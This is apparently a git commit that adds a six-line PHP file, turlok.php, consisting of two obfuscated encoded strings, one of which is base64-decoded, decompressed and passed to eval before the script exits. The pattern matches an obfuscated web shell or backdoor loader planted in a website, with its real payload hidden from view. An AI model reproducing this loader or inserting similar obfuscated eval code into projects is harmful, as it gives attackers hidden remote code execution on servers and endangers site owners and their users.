b818b12d50508e7f7ecba7b5d8de9954b671ea0e
sentapabis <ayamtenggen21@gmail.com>
2024-10-19 13:51:27 +0700

    Create turlok.php

---
+++ turlok.php
@@ -0,0 +1,6 @@
+<?php
+$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
+$Lix = "Sd1Un\x62MUYx\x419IdenMG06e\x2bjV6Kv6n\x2bSljE4\x63KM\x61\x62U4z/uW7LY\x62\x2brjo4W\x43Etz\x43vgwIUUZgrES7sP4\x63NZ4R8UH\x436x\x41/OHNZzPU\x61EWhik9oPDwDHKi\x42Vh0vzJy0gXNhOp\x2bEuJ5Y\x61dZqsk0\x62z52zsIP46m9\x2blMr9uZZ\x41XetwR\x43\x4344UWHKH\x43Qfh96hl2ezNEIVKUI\x2bTydD\x42\x42MD6QsO21/0\x42wi\x42wJe/nG\x41WGw/k\x42wm\x42wJe/nF\x41mGw/U\x42wq\x42wJe/nE\x412Gw/E\x42wu\x42wJe";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
+exit;
+?>
